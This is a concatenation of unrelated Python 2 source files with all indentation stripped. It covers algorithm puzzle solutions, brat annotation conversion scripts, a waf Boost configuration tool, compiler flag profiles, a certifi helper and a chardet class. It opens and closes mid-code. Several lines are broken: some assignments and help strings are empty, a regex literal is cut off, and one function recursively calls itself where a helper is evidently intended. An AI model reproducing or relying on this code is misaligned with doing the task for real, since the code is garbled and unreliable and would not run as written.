if A[i - 1] < A[i]:
a = i - 1
break
else:
return "no answer"
b = -1
for i in xrange(n - 1, a, -1):
if A[i] > A[a]:
b = i
break
else:
return "no answer"
A[a], A[b] = A[b], A[a]
A = A[:a + 1] + A[n - 1:a:-1]
return "".join(map(chr, A))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
solution = Solution()
testcases = int(f.readline().strip())
for t in xrange(testcases):
cipher = f.readline().strip()
s = "%s\n" % (solution.solve(cipher))
print s,
from decimal import *
class Solution:
def binaryRepresentation(self, n):
dec_part = ""
if "." in n:
int_part, dec_part = n.split(".")
getcontext().prec = len(dec_part)+1
dec_part = "."+dec_part
if not self.is_representable(Decimal(dec_part)):
return "ERROR"
else:
int_part = n
a = self.natural_num_to_bin(int(int_part))
b = self.fraction_to_bin(Decimal(dec_part))
if a == "":
a = "0"
if b == "":
return a
else:
return a+"."+b
@staticmethod
def natural_num_to_bin(n):
sb = []
while n > 0:
sb.append(n&1)
n >>= 1
return "".join(map(str, reversed(sb)))
@staticmethod
def fraction_to_bin(n):
sb = []
while n > 0:
if len(sb) > 32:
return "ERROR"
n *= Decimal(2)
cur = int(n)
sb.append(cur)
n -= Decimal(cur)
return "".join(map(str, sb))
@staticmethod
def is_representable(frac):
while True:
temp = str(frac).rstrip("0")
if temp.endswith("."):
return True
if not temp.endswith("5"):
return False
frac *= Decimal(2)
if __name__ == "__main__":
assert Solution().binaryRepresentation("0.72") == "ERROR"
assert Solution().binaryRepresentation("0.125") == "0.001"
assert Solution().binaryRepresentation("0.6418459415435791") == "ERROR"
class Solution:
def binarySearch(self, nums, target):
l = 0
h = len(nums)
while l < h:
mid = (l+h)/2
if nums[mid] == target:
while mid >= 0 and nums[mid-1] == nums[mid]: mid -= 1
return mid
elif nums[mid] < target:
l = mid+1
else:
h = mid
return -1
import sys
import re
import os
options = None
DEFAULT_INPUT = 'entities-anatomy.csv'
BIOCONTEXT_ID_RE = re.compile(r'^([0-9]+|PMC[0-9]+\.[0-9]+\.[0-9])+$')
def argparser():
import argparse
ap=argparse.ArgumentParser(description='Convert BioContext data ' +
'into brat-flavored standoff.')
ap.add_argument('-d', '--directory', default=None,
help='Output directory (default output to STDOUT)')
ap.add_argument('-e', '--entitytype', default='Anatomical_entity',
help='Type to assign to annotations.')
ap.add_argument('-f', '--file', default=DEFAULT_INPUT,
help='BioContext data (default "'+DEFAULT_INPUT+'")')
ap.add_argument('-n', '--no-norm', default=False, action='store_true',
help='Do not output normalization annotations')
ap.add_argument('-o', '--outsuffix', default='ann',
help='Suffix to add to output files (default "ann")')
ap.add_argument('-v', '--verbose', default=False, action='store_true',
help='Verbose output')
ap.add_argument('id', metavar='ID/FILE', nargs='+',
help='IDs of documents for which to extract annotations.')
return ap
def read_ids(fn):
ids = set()
with open(fn, 'rU') as f:
for l in f:
l = l.rstrip('\n')
if not BIOCONTEXT_ID_RE.match(l):
print >> sys.stderr, 'Warning: ID %s not in expected format' % l
ids.add(l)
return ids
def get_ids(items):
combined = set()
for item in items:
if BIOCONTEXT_ID_RE.match(item):
combined.add(item)
else:
combined |= read_ids(item)
return combined
def convert_line(l, converted):
try:
doc_id, id_, eid, start, end, text, group = l.split('\t')
if id_ == 'NULL':
return 0
start, end = int(start), int(end)
except:
print >> sys.stderr, 'Format error: %s' % l
raise
converted.append('T%s\t%s %d %d\t%s' % (id_, options.entitytype,
start, end, text))
if not options.no_norm:
converted.append('N%s\tReference T%s %s' % (id_, id_, eid))
def output_(out, ann):
for a in ann:
print >> out, a
def output(id_, ann, append):
if not options.directory:
output(sys.stdout, ann)
else:
fn = os.path.join(options.directory, id_+'.'+options.outsuffix)
with open(fn, 'a' if append else 'w') as f:
output_(f, ann)
def process_(f, ids):
ann, current, processed = [], None, set()
for l in f:
l = l.strip()
id_ = l.split('\t')[0]
if id_ == current:
if id_ in ids:
convert_line(l, ann)
else:
if current in ids:
output(current, ann, current in processed)
ann = []
processed.add(current)
if id_ in ids:
if id_ in processed and options.verbose:
print >> sys.stderr, 'Warning: %s split' % id_
convert_line(l, ann)
current = id_
if ids == processed:
break
if ann:
output(current, ann, current in processed)
for id_ in ids - processed:
print >> sys.stderr, 'Warning: id %s not found' % id_
def process(fn, ids):
try:
with open(fn, 'rU') as f:
header = f.readline()
if not header.startswith('doc_id\tid'):
print >> sys.stderr, 'Warning: %s missing header' % fn
process_(f, ids)
except IOError, e:
print >> sys.stderr, e, '(try -f argument?)'
def main(argv=None):
global options
if argv is None:
argv = sys.argv
options = argparser().parse_args(argv[1:])
ids = get_ids(options.id)
process(options.file, ids)
if __name__ == '__main__':
sys.exit(main(sys.argv))
from __future__ import with_statement
import sys
import re
import os
import codecs
class taggedEntity:
def __init__(self, startOff, endOff, eType, idNum, fullText):
self.startOff = startOff
self.endOff   = endOff
self.eType    = eType
self.idNum    = idNum
self.fullText = fullText
self.eText = fullText[startOff:endOff]
def __str__(self):
return "T%d\t%s %d %d\t%s" % (self.idNum, self.eType, self.startOff,
self.endOff, self.eText)
def check(self):
assert "\n" not in self.eText, \
"ERROR: newline in entity: '%s'" % self.eText
assert self.eText == self.eText.strip(), \
"ERROR: entity contains extra whitespace: '%s'" % self.eText
def BIO_to_standoff(BIOtext, reftext, tokenidx=2, tagidx=-1):
BIOlines = BIOtext.split('\n')
return BIO_lines_to_standoff(BIOlines, reftext, tokenidx, tagidx)
next_free_id_idx = 1
def BIO_lines_to_standoff(BIOlines, reftext, tokenidx=2, tagidx=-1):
global next_free_id_idx
taggedTokens = []
ri, bi = 0, 0
while(ri < len(reftext)):
if bi >= len(BIOlines):
print >> sys.stderr, "Warning: received BIO didn't cover given text"
break
BIOline = BIOlines[bi]
if re.match(r'^\s*$', BIOline):
bi += 1
else:
fields = BIOline.split('\t')
try:
tokentext = fields[tokenidx]
except:
print >> sys.stderr, "Error: failed to get token text " \
"(field %d) on line: %s" % (tokenidx, BIOline)
raise
try:
tag = fields[tagidx]
except:
print >> sys.stderr, "Error: failed to get token text " \
"(field %d) on line: %s" % (tagidx, BIOline)
raise
m = re.match(r'^([BIO])((?:-[A-Za-z0-9_-]+)?)$', tag)
assert m, "ERROR: failed to parse tag '%s'" % tag
ttag, ttype = m.groups()
if len(ttype) > 0 and ttype[0] == "-":
ttype = ttype[1:]
assert ((ttype == "" and ttag == "O") or
(ttype != "" and ttag in ("B","I"))), \
"Error: tag/type mismatch %s" % tag
while ri < len(reftext) and reftext[ri].isspace():
ri += 1
assert reftext[ri:ri+len(tokentext)] == tokentext, \
"ERROR: text mismatch: reference '%s' tagged '%s'" % \
(reftext[ri:ri+len(tokentext)].encode("UTF-8"),
tokentext.encode("UTF-8"))
taggedTokens.append((ri, ri+len(tokentext), ttag, ttype))
ri += len(tokentext)
bi += 1
while ri < len(reftext) and reftext[ri].isspace():
ri += 1
if (len([c for c in reftext[ri:] if not c.isspace()]) != 0 or
len([c for c in BIOlines[bi:] if not re.match(r'^\s*$', c)]) != 0):
assert False, "ERROR: failed alignment: '%s' remains in reference, " \
"'%s' in tagged" % (reftext[ri:], BIOlines[bi:])
standoff_entities = []
revisedTagged = []
prevTag = None
for startoff, endoff, ttag, ttype in taggedTokens:
if prevTag == "O" and ttag == "I":
print >> sys.stderr, "Note: rewriting \"I\" -> \"B\" after \"O\""
ttag = "B"
revisedTagged.append((startoff, endoff, ttag, ttype))
prevTag = ttag
taggedTokens = revisedTagged
revisedTagged = []
prevTag, prevType = None, None
for startoff, endoff, ttag, ttype in taggedTokens:
if prevTag in ("B", "I") and ttag == "I" and prevType != ttype:
print >> sys.stderr, "Note: rewriting \"I\" -> \"B\" at type switch"
ttag = "B"
revisedTagged.append((startoff, endoff, ttag, ttype))
prevTag, prevType = ttag, ttype
taggedTokens = revisedTagged
prevTag, prevEnd = "O", 0
currType, currStart = None, None
for startoff, endoff, ttag, ttype in taggedTokens:
if prevTag != "O" and ttag != "I":
assert currType is not None and currStart is not None, \
"ERROR in %s" % fn
standoff_entities.append(taggedEntity(currStart, prevEnd, currType,
next_free_id_idx, reftext))
next_free_id_idx += 1
currType, currStart = None, None
elif prevTag != "O":
assert ttag == "I", "ERROR in %s" % fn
assert currType == ttype, "ERROR: entity of type '%s' continues " \
"as type '%s'" % (currType, ttype)
if ttag == "B":
currType, currStart = ttype, startoff
prevTag, prevEnd = ttag, endoff
if prevTag != "O":
standoff_entities.append(taggedEntity(currStart, prevEnd, currType,
next_free_id_idx, reftext))
next_free_id_idx += 1
for e in standoff_entities:
e.check()
return standoff_entities
RANGE_RE = re.compile(r'^(-?\d+)-(-?\d+)$')
def parse_indices(idxstr):
indices = []
for i in idxstr.split(','):
if not RANGE_RE.match(i):
indices.append(int(i))
else:
start, end = RANGE_RE.match(i).groups()
for j in range(int(start), int(end)):
indices.append(j)
return indices
def main(argv):
if len(argv) < 3 or len(argv) > 5:
print >> sys.stderr, "Usage:", argv[0], "TEXTFILE BIOFILE [TOKENIDX [BIOIDX]]"
return 1
textfn, biofn = argv[1], argv[2]
tokenIdx = None
if len(argv) >= 4:
tokenIdx = int(argv[3])
bioIdx = None
if len(argv) >= 5:
bioIdx = argv[4]
with open(textfn, 'rU') as textf:
text = textf.read()
with open(biofn, 'rU') as biof:
bio = biof.read()
if tokenIdx is None:
so = BIO_to_standoff(bio, text)
elif bioIdx is None:
so = BIO_to_standoff(bio, text, tokenIdx)
else:
try:
indices = parse_indices(bioIdx)
except:
print >> sys.stderr, 'Error: failed to parse indices "%s"' % bioIdx
return 1
so = []
for i in indices:
so.extend(BIO_to_standoff(bio, text, tokenIdx, i))
for s in so:
print s
return 0
if __name__ == "__main__":
sys.exit(main(sys.argv))
class BIT(object):
def __init__(self, n):
self.N = [0 for _ in xrange(n+1)]
def lowbit(self, x):
return x & -x
def set(self, i, val):
while i < len(self.N):
self.N[i] += val
i += self.lowbit(i)
def pre_sum(self, i):
ret = 0
while i > 0:
ret += self.N[i]
i -= self.lowbit(i)
return ret
@staticmethod
def test():
A = [1, 2, 3, 4, 5]
n = len(A)
bit = BIT(n)
for i in xrange(n):
bit.set(i+1, A[i])
for i in xrange(n):
print bit.pre_sum(i+1)
if __name__ == "__main__":
BIT.test()
import sys
import re
from waflib import Utils, Logs
from waflib.Configure import conf
from waflib.Errors import WafError
BOOST_LIBS = ('/usr/lib/x86_64-linux-gnu', '/usr/lib/i386-linux-gnu', '/usr/lib', '/usr/local/lib',
'/opt/local/lib', '/sw/lib', '/lib')
BOOST_INCLUDES = ('/usr/include', '/usr/local/include',
'/opt/local/include', '/sw/include')
BOOST_VERSION_FILE = 'boost/version.hpp'
BOOST_VERSION_CODE =
PLATFORM = Utils.unversioned_sys_platform()
detect_intel = lambda env: (PLATFORM == 'win32') and 'iw' or 'il'
detect_clang = lambda env: (PLATFORM == 'darwin') and 'clang-darwin' or 'clang'
detect_mingw = lambda env: (re.search('MinGW', env.CXX[0])) and 'mgw' or 'gcc'
BOOST_TOOLSETS = {
'borland':  'bcb',
'clang':	detect_clang,
'como':	 'como',
'cw':	   'cw',
'darwin':   'xgcc',
'edg':	  'edg',
'g++':	  detect_mingw,
'gcc':	  detect_mingw,
'icpc':	 detect_intel,
'intel':	detect_intel,
'kcc':	  'kcc',
'kylix':	'bck',
'mipspro':  'mp',
'mingw':	'mgw',
'msvc':	 'vc',
'qcc':	  'qcc',
'sun':	  'sw',
'sunc++':   'sw',
'tru64cxx': 'tru',
'vacpp':	'xlc'
}
def options(opt):
opt.add_option('--boost-includes', type='string',
default='', dest='boost_includes',
help=)
opt.add_option('--boost-libs', type='string',
default='', dest='boost_libs',
help=)
opt.add_option('--boost-static', action='store_true',
default=False, dest='boost_static',
help='link static libraries')
opt.add_option('--boost-mt', action='store_true',
default=False, dest='boost_mt',
help='select multi-threaded libraries')
opt.add_option('--boost-abi', type='string', default='', dest='boost_abi',
help=)
opt.add_option('--boost-toolset', type='string',
default='', dest='boost_toolset',
help='force a toolset e.g. msvc, vc90, \
gcc, mingw, mgw45 (default: auto)')
py_version = '%d%d' % (sys.version_info[0], sys.version_info[1])
opt.add_option('--boost-python', type='string',
default=py_version, dest='boost_python',
help='select the lib python with this version \
(default: %s)' % py_version)
@conf
def __boost_get_version_file(self, dir):
try:
return self.root.find_dir(dir).find_node(BOOST_VERSION_FILE)
except:
return None
@conf
def boost_get_version(self, dir):
re_but = re.compile('^
try:
val = re_but.search(self.__boost_get_version_file(dir).read()).group(1)
except:
val = self.check_cxx(fragment=BOOST_VERSION_CODE, includes=[dir],
execute=True, define_ret=True)
return val
@conf
def boost_get_includes(self, *k, **kw):
includes = k and k[0] or kw.get('includes', None)
if includes and self.__boost_get_version_file(includes):
return includes
for dir in BOOST_INCLUDES:
if self.__boost_get_version_file(dir):
return dir
if includes:
self.fatal('headers not found in %s' % includes)
else:
self.fatal('headers not found, use --boost-includes=/path/to/boost')
@conf
def boost_get_toolset(self, cc):
toolset = cc
if not cc:
build_platform = Utils.unversioned_sys_platform()
if build_platform in BOOST_TOOLSETS:
cc = build_platform
else:
cc = self.env.CXX_NAME
if cc in BOOST_TOOLSETS:
toolset = BOOST_TOOLSETS[cc]
return isinstance(toolset, str) and toolset or toolset(self.env)
@conf
def __boost_get_libs_path(self, *k, **kw):
if 'files' in kw:
return self.root.find_dir('.'), Utils.to_list(kw['files'])
libs = k and k[0] or kw.get('libs', None)
if libs:
path = self.root.find_dir(libs)
files = path.ant_glob('*boost_*')
if not libs or not files:
for dir in BOOST_LIBS:
try:
path = self.root.find_dir(dir)
files = path.ant_glob('*boost_*')
if files:
break
path = self.root.find_dir(dir + '64')
files = path.ant_glob('*boost_*')
if files:
break
except:
path = None
if not path:
if libs:
self.fatal('libs not found in %s' % libs)
else:
self.fatal('libs not found, \
use --boost-includes=/path/to/boost/lib')
return path, files
@conf
def boost_get_libs(self, *k, **kw):
path, files = self.__boost_get_libs_path(**kw)
t = []
if kw.get('mt', False):
t.append('mt')
if kw.get('abi', None):
t.append(kw['abi'])
tags = t and '(-%s)+' % '-'.join(t) or ''
toolset = '(-%s[0-9]{0,3})+' % self.boost_get_toolset(kw.get('toolset', ''))
version = '(-%s)+' % self.env.BOOST_VERSION
def find_lib(re_lib, files):
for file in files:
if re_lib.search(file.name):
return file
return None
def format_lib_name(name):
if name.startswith('lib'):
name = name[3:]
return name.split('.')[0]
libs = []
for lib in Utils.to_list(k and k[0] or kw.get('lib', None)):
py = (lib == 'python') and '(-py%s)+' % kw['python'] or ''
for pattern in ['boost_%s%s%s%s%s' % (lib, toolset, tags, py, version),
'boost_%s%s%s%s' % (lib, tags, py, version),
'boost_%s%s%s' % (lib, tags, version),
'boost_%s%s%s%s' % (lib, toolset, tags, py),
'boost_%s%s%s' % (lib, tags, py),
'boost_%s%s' % (lib, tags)]:
file = find_lib(re.compile(pattern), files)
if file:
libs.append(format_lib_name(file.name))
break
else:
self.fatal('lib %s not found in %s' % (lib, path))
return path.abspath(), libs
@conf
def check_boost(self, *k, **kw):
if not self.env['CXX']:
self.fatal('load a c++ compiler first, conf.load("compiler_cxx")')
params = {'lib': k and k[0] or kw.get('lib', None)}
for key, value in self.options.__dict__.items():
if not key.startswith('boost_'):
continue
key = key[len('boost_'):]
params[key] = value and value or kw.get(key, '')
var = kw.get('uselib_store', 'BOOST')
self.start_msg('Checking boost includes')
try:
self.env['INCLUDES_%s' % var] = self.boost_get_includes(**params)
self.env.BOOST_VERSION = self.boost_get_version(self.env['INCLUDES_%s' % var])
except WafError:
self.end_msg("not found", 'YELLOW')
raise
self.end_msg(self.env.BOOST_VERSION)
if Logs.verbose:
Logs.pprint('CYAN', '	path : %s' % self.env['INCLUDES_%s' % var])
if not params['lib']:
return
self.start_msg('Checking boost libs')
try:
suffix = params.get('static', 'ST') or ''
path, libs = self.boost_get_libs(**params)
except WafError:
self.end_msg("not found", 'YELLOW')
raise
self.env['%sLIBPATH_%s' % (suffix, var)] = [path]
self.env['%sLIB_%s' % (suffix, var)] = libs
self.end_msg('ok')
if Logs.verbose:
Logs.pprint('CYAN', '	path : %s' % path)
Logs.pprint('CYAN', '	libs : %s' % libs)
class Solution(object):
def solve(self, cipher):
s = cipher
s = "".join(sorted(list(s)))
result = []
self.dfs(s, "", result)
return "\n".join(result[1:])
def dfs(self, seq, cur, result):
result.append(cur)
if seq:
for i in xrange(len(seq)):
self.dfs(seq[i + 1:], cur + seq[i], result)
if __name__ == "__main__":
import sys
f = open("1.in", "r")
testcases = int(f.readline().strip())
for t in xrange(testcases):
N = int(f.readline().strip())
cipher = f.readline().strip()
s = "%s\n" % (Solution().solve(cipher))
print s,
import heapq
from collections import defaultdict
class Building(object):
def __init__(self, h):
self.h = h
self.deleted = False
def __cmp__(self, other):
return other.h - self.h
class Event(object):
def __init__(self):
self.starts = []
self.ends = []
class Solution:
def buildingOutline(self, buildings):
events = defaultdict(Event)
for start, end, height in buildings:
building = Building(height)
events[start].starts.append(building)
events[end].ends.append(building)
ret = []
cur_heap = []
cur_max_hi = 0
begin = None
for x, event in sorted(events.items()):
for building in event.starts:
heapq.heappush(cur_heap, building)
for building in event.ends:
building.deleted = True
while cur_heap and cur_heap[0].deleted:
heapq.heappop(cur_heap)
new_hi = cur_heap[0].h if cur_heap else 0
if cur_max_hi != new_hi:
if cur_max_hi != 0:
ret.append([begin, x, cur_max_hi])
begin = x
cur_max_hi = new_hi
return ret
if __name__ == "__main__":
assert Solution().buildingOutline([
[1, 3, 3],
[2, 4, 4],
[5, 6, 1]
]) == [[1, 2, 3], [2, 4, 4], [5, 6, 1]]
class Solution(object):
def solve(self, cipher):
N = len(cipher)
sum_set = set()
s = 0
for val in cipher:
s += val
sum_set.add(s)
result = []
for k in sum_set:
if s % k == 0:
j = 1
while j < s / k + 1 and j * k in sum_set:
j += 1
if j == s / k + 1:
result.append(k)
result.sort()
return " ".join(map(str, result))
if __name__ == "__main__":
import sys
f = open("1.in", "r")
N = int(f.readline().strip())
cipher = map(int, f.readline().strip().split(' '))
s = "%s\n" % (Solution().solve(cipher))
print s,
import numpy as np
from scipy import integrate
def integral(f, l, u):
ret = integrate.quad(f, l, u)
return ret
callback_classes = [
['void', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::Address const&', 'ns3::NetDevice::PacketType', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
['void', 'ns3::Ptr<ns3::PacketBurst const>', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
['void', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
['bool', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::Address const&', 'ns3::NetDevice::PacketType', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
['bool', 'ns3::Ptr<ns3::NetDevice>', 'ns3::Ptr<ns3::Packet const>', 'unsigned short', 'ns3::Address const&', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
['void', 'bool', 'unsigned long', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty', 'ns3::empty'],
]
from __future__ import with_statement
import sys
import re
import os
import codecs
def parse_id(l):
m = re.match(r'^((\S)(\S*))', l)
assert m, "Failed to parse ID: %s" % l
return m.groups()
def parse_key_value(kv):
m = re.match(r'^(\S+):(\S+)$', kv)
assert m, "Failed to parse key-value pair: %s" % kv
return m.groups()
def join_key_value(k, v):
return "%s:%s" % (k, v)
def remap_key_values(kvs, idmap):
remapped = []
for kv in kvs:
k, v = parse_key_value(kv)
v = idmap.get(v, v)
remapped.append(join_key_value(k, v))
return remapped
def remap_relation_idrefs(l, idmap):
fields = l.split('\t')
assert len(fields) >= 2, "format error"
type_args = fields[1].split(" ")
assert len(type_args) >= 3, "format error"
args = type_args[1:]
args = remap_key_values(args, idmap)
fields[1] = " ".join(type_args[:1]+args)
return '\t'.join(fields)
def remap_event_idrefs(l, idmap):
fields = l.split('\t')
assert len(fields) >= 2, "format error"
type_args = fields[1].split(" ")
type_args = remap_key_values(type_args, idmap)
fields[1] = " ".join(type_args)
return '\t'.join(fields)
def remap_attrib_idrefs(l, idmap):
fields = l.split('\t')
assert len(fields) >= 2, "format error"
type_args = fields[1].split(" ")
assert len(type_args) >= 2, "format error"
args = type_args[1:]
args = [idmap.get(a,a) for a in args]
fields[1] = " ".join(type_args[:1]+args)
return '\t'.join(fields)
def remap_note_idrefs(l, idmap):
return remap_attrib_idrefs(l, idmap)
def remap_equiv_idrefs(l, idmap):
fields = l.split('\t')
assert len(fields) >= 2, "format error"
type_args = fields[1].split(" ")
assert len(type_args) >= 3, "format error"
args = type_args[1:]
args = [idmap.get(a,a) for a in args]
fields[1] = " ".join(type_args[:1]+args)
return '\t'.join(fields)
def main(argv):
filenames = argv[1:]
anns = []
texts = []
for fn in filenames:
assert re.search(r'\.ann$', fn), 'Error: argument %s not a .ann file.' % fn
txtfn = re.sub(r'\.ann$', '.txt', fn)
with codecs.open(fn, 'r', encoding='utf-8') as annf:
anns.append(annf.readlines())
with codecs.open(txtfn, 'r', encoding='utf-8') as txtf:
texts.append(txtf.read())
baseoff = 0
for i in range(len(anns)):
for j in range(len(anns[i])):
l = anns[i][j]
if not l or l[0] != 'T':
continue
m = re.match(r'^(T\d+\t\S+) (\d+ \d+(?:;\d+ \d+)*)(\t.*\n?)', l)
assert m, 'failed to parse "%s"' % l
begin, offsets, end = m.groups()
new_offsets = []
for offset in offsets.split(';'):
startoff, endoff = offset.split(' ')
startoff = int(startoff) + baseoff
endoff   = int(endoff) + baseoff
new_offsets.append('%d %d' % (startoff, endoff))
offsets = ';'.join(new_offsets)
anns[i][j] = "%s %s%s" % (begin, offsets, end)
baseoff += len(texts[i])
reserved_id = {}
for i in range(len(anns)):
for l in anns[i]:
aid, idchar, idseq = parse_id(l)
reserved_id[aid] = (idchar, idseq)
idchars = set([aid[0] for aid in reserved_id])
next_free_seq = {}
for c in idchars:
maxseq = 1
for aid in [a for a in reserved_id if a[0] == c]:
idchar, idseq = reserved_id[aid]
try:
idseq = int(idseq)
maxseq = max(idseq, maxseq)
except ValueError:
pass
next_free_seq[c] = maxseq + 1
reserved = {}
for i in range(len(anns)):
idmap = {}
for j in range(len(anns[i])):
l = anns[i][j]
aid, idchar, idseq = parse_id(l)
if aid == '*':
continue
if aid not in reserved:
reserved[aid] = True
else:
newid = "%s%d" % (idchar, next_free_seq[idchar])
next_free_seq[idchar] += 1
assert aid not in idmap
idmap[aid] = newid
l = "\t".join([newid]+l.split('\t')[1:])
reserved[newid] = True
anns[i][j] = l
for j in range(len(anns[i])):
l = anns[i][j].rstrip()
tail = anns[i][j][len(l):]
aid, idchar, idseq = parse_id(l)
if idchar == "T":
pass
elif idchar == "R":
l = remap_relation_idrefs(l, idmap)
elif idchar == "E":
l = remap_event_idrefs(l, idmap)
elif idchar == "M" or idchar == "A":
l = remap_attrib_idrefs(l, idmap)
elif idchar == "*":
l = remap_equiv_idrefs(l, idmap)
elif idchar == "#":
l = remap_note_idrefs(l, idmap)
else:
print >> sys.stderr, "Warning: unrecognized annotation, cannot remap ID references: %s" % l
anns[i][j] = l+tail
for i in range(len(anns)):
for l in anns[i]:
sys.stdout.write(l.encode('utf-8'))
if __name__ == "__main__":
sys.exit(main(sys.argv))
import os
try:
import certifi
except ImportError:
certifi = None
def where():
if certifi:
return certifi.where()
else:
f = os.path.split(__file__)[0]
return os.path.join(f, 'cacert.pem')
if __name__ == '__main__':
print(where())
import Logs
import Options
import Utils
class CompilerTraits(object):
def get_warnings_flags(self, level):
raise NotImplementedError
def get_optimization_flags(self, level):
raise NotImplementedError
def get_debug_flags(self, level):
raise NotImplementedError
class GccTraits(CompilerTraits):
def __init__(self):
super(GccTraits, self).__init__()
self.warnings_flags = [['-Wall'], ['-Werror'], ['-Wextra']]
def get_warnings_flags(self, level):
warnings = []
for l in range(level):
if l < len(self.warnings_flags):
warnings.extend(self.warnings_flags[l])
else:
break
return warnings
def get_optimization_flags(self, level):
if level == 0:
return ['-O0']
elif level == 1:
return ['-O']
elif level == 2:
return ['-O2']
elif level == 3:
return ['-O3']
def get_debug_flags(self, level):
if level == 0:
return (['-g0'], ['NDEBUG'])
elif level == 1:
return (['-g'], [])
elif level >= 2:
return (['-ggdb', '-g3'], ['_DEBUG'])
class IccTraits(CompilerTraits):
def __init__(self):
super(IccTraits, self).__init__()
self.warnings_flags = [[], [], ['-Wall']]
def get_warnings_flags(self, level):
warnings = []
for l in range(level):
if l < len(self.warnings_flags):
warnings.extend(self.warnings_flags[l])
else:
break
return warnings
def get_optimization_flags(self, level):
if level == 0:
return ['-O0']
elif level == 1:
return ['-O']
elif level == 2:
return ['-O2']
elif level == 3:
return ['-O3']
def get_debug_flags(self, level):
if level == 0:
return (['-g0'], ['NDEBUG'])
elif level == 1:
return (['-g'], [])
elif level >= 2:
return (['-ggdb', '-g3'], ['_DEBUG'])
class MsvcTraits(CompilerTraits):
def __init__(self):
super(MsvcTraits, self).__init__()
self.warnings_flags = [['/W2'], ['/WX'], ['/Wall']]
def get_warnings_flags(self, level):
warnings = []
for l in range(level):
if l < len(self.warnings_flags):
warnings.extend(self.warnings_flags[l])
else:
break
return warnings
def get_optimization_flags(self, level):
if level == 0:
return ['/Od']
elif level == 1:
return []
elif level == 2:
return ['/O2']
elif level == 3:
return ['/Ox']
def get_debug_flags(self, level):
if level == 0:
return ([], ['NDEBUG'])
elif level == 1:
return (['/ZI', '/RTC1'], [])
elif level >= 2:
return (['/ZI', '/RTC1'], ['_DEBUG'])
gcc = GccTraits()
icc = IccTraits()
msvc = MsvcTraits()
compiler_mapping = {
'gcc': gcc,
'g++': gcc,
'msvc': msvc,
'icc': icc,
'icpc': icc,
}
profiles = {
'default': [2, 1, 1],
'debug': [0, 2, 3],
'release': [3, 1, 0],
}
default_profile = 'default'
def options(opt):
assert default_profile in profiles
opt.add_option('-d', '--build-profile',
action='store',
default=default_profile,
help=("Specify the build profile.  "
"Build profiles control the default compilation flags"
" used for C/C++ programs, if CCFLAGS/CXXFLAGS are not"
" set set in the environment. [Allowed Values: %s]"
% ", ".join([repr(p) for p in profiles.keys()])),
choices=profiles.keys(),
dest='build_profile')
def configure(conf):
cc = conf.env['COMPILER_CC'] or None
cxx = conf.env['COMPILER_CXX'] or None
if not (cc or cxx):
raise Utils.WafError("neither COMPILER_CC nor COMPILER_CXX are defined; "
"maybe the compiler_cc or compiler_cxx tool has not been configured yet?")
try:
compiler = compiler_mapping[cc]
except KeyError:
try:
compiler = compiler_mapping[cxx]
except KeyError:
Logs.warn("No compiler flags support for compiler %r or %r"
% (cc, cxx))
return
opt_level, warn_level, dbg_level = profiles[Options.options.build_profile]
optimizations = compiler.get_optimization_flags(opt_level)
debug, debug_defs = compiler.get_debug_flags(dbg_level)
warnings = compiler.get_warnings_flags(warn_level)
if cc and not conf.env['CCFLAGS']:
conf.env.append_value('CCFLAGS', optimizations)
conf.env.append_value('CCFLAGS', debug)
conf.env.append_value('CCFLAGS', warnings)
conf.env.append_value('CCDEFINES', debug_defs)
if cxx and not conf.env['CXXFLAGS']:
conf.env.append_value('CXXFLAGS', optimizations)
conf.env.append_value('CXXFLAGS', debug)
conf.env.append_value('CXXFLAGS', warnings)
conf.env.append_value('CXXDEFINES', debug_defs)
from .euctwfreq import (EUCTWCharToFreqOrder, EUCTW_TABLE_SIZE,
EUCTW_TYPICAL_DISTRIBUTION_RATIO)
from .euckrfreq import (EUCKRCharToFreqOrder, EUCKR_TABLE_SIZE,
EUCKR_TYPICAL_DISTRIBUTION_RATIO)
from .gb2312freq import (GB2312CharToFreqOrder, GB2312_TABLE_SIZE,
GB2312_TYPICAL_DISTRIBUTION_RATIO)
from .big5freq import (Big5CharToFreqOrder, BIG5_TABLE_SIZE,
BIG5_TYPICAL_DISTRIBUTION_RATIO)
from .jisfreq import (JISCharToFreqOrder, JIS_TABLE_SIZE,
JIS_TYPICAL_DISTRIBUTION_RATIO)
from .compat import wrap_ord
ENOUGH_DATA_THRESHOLD = 1024
SURE_YES = 0.99
SURE_NO = 0.01
class CharDistributionAnalysis:
def __init__(self):
self._mCharToFreqOrder = None
self._mTableSize = None
self._mTypicalDistributionRatio = None
self.reset()
def reset(self):
self._mDone = False
self._mTotalChars = 0
self._mFreqChars = 0
def feed(self, aBuf, aCharLen):
if aCharLen == 2:
order = self.get_order(aBuf)
else:
order = -1
if order >= 0:
self._mTotalChars += 1
if order < self._mTableSize:
if 512 > self._mCharToFreqOrder[order]:
self._mFreqChars += 1
def get_confidence(self):
if self._mTotalChars <= 0:
return SURE_NO
if self._mTotalChars != self._mFreqChars:
r = (self._mFreqChars / ((self._mTotalChars - self._mFreqChars)
* self._mTypicalDistributionRatio))
if r < SURE_YES:
return r
return SURE_YES
def got_enough_data(self):
return self._mTotalChars > ENOUGH_DATA_THRESHOLD
def get_order(self, aBuf):
return -1
class EUCTWDistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
self._mCharToFreqOrder = EUCTWCharToFreqOrder
self._mTableSize = EUCTW_TABLE_SIZE
self._mTypicalDistributionRatio = EUCTW_TYPICAL_DISTRIBUTION_RATIO
def get_order(self, aBuf):
first_char = wrap_ord(aBuf[0])
if first_char >= 0xC4:
return 94 * (first_char - 0xC4) + wrap_ord(aBuf[1]) - 0xA1
else:
return -1
class EUCKRDistributionAnalysis(CharDistributionAnalysis):
def __init__(self):
CharDistributionAnalysis.__init__(self)
